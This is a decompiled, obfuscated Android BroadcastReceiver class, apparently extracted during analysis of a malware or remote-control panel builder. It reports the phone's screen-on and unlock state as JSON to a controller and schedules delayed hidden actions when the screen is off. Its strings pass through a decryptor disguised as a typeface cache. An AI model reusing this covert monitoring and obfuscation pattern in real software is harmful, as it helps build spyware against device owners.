package app.mobilex.plus.services;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import app.mobilex.plus.util.TypefaceCache;
import org.json.JSONException;
import org.json.JSONObject;
import v.s.RWY6BVSB0XxPbw;
import v.s.Y9mRyRdkl5FOcwb66V6;
import v.s.hzCVl0f866ksvpzUUql;
import v.s.iStgVlW5d7CQ5MhFi;
import v.s.jdOQeRk37T35X5xKW1P;
import v.s.okc5AGRjqrud84oM6d;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class HelperHRAdapter$registerScreenStateReceiver$1 extends BroadcastReceiver {
    public static final /* synthetic */ int w9sT1Swbhx3hs = 0;
    public final /* synthetic */ RWY6BVSB0XxPbw dDIMxZXP1V8HdM;

    public HelperHRAdapter$registerScreenStateReceiver$1(RWY6BVSB0XxPbw rWY6BVSB0XxPbw) {
        this.dDIMxZXP1V8HdM = rWY6BVSB0XxPbw;
    }

    private static /* synthetic */ void xcxioutn() {
    }

    @Override // android.content.BroadcastReceiver
    public final void onReceive(Context context, Intent intent) throws JSONException {
        boolean z = okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(intent.getAction(), "android.intent.action.SCREEN_ON") || okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(intent.getAction(), "android.intent.action.USER_PRESENT");
        RWY6BVSB0XxPbw rWY6BVSB0XxPbw = this.dDIMxZXP1V8HdM;
        JSONObject jSONObject = new JSONObject();
        Y9mRyRdkl5FOcwb66V6.Qrz92kRPw4GcghAc("003000750049008200F500B100ED00B400370077004F0082", jSONObject, TypefaceCache.obtain("0037006F004B0082"), "003000750049008200F500B100ED00A8002D", z);
        rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject);
        iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
        TypefaceCache.obtain("001000750049008200F500B1009200B400370077004F008200B000BD00C000A8002200720058008600E300AB008800E7003000750049008200F500B100ED00A8002D002B");
        if (!z && this.dDIMxZXP1V8HdM.YIgR6F2ZXmLx2ul && this.dDIMxZXP1V8HdM.XiR1pIn5878vVWd) {
            TypefaceCache.obtain("00280073005E009700C300BC00C000A2002600780074008900AA00FF00D300B2003700790016009000F100B400DB00A900240036005A008100E400BA00C000E700100055006900A200D5009100ED008800050050");
            this.dDIMxZXP1V8HdM.nQilHWaqS401ZtR.postDelayed(new jdOQeRk37T35X5xKW1P(11), 200L);
            this.dDIMxZXP1V8HdM.nQilHWaqS401ZtR.postDelayed(new hzCVl0f866ksvpzUUql(10, context), 1500L);
        }
    }
}
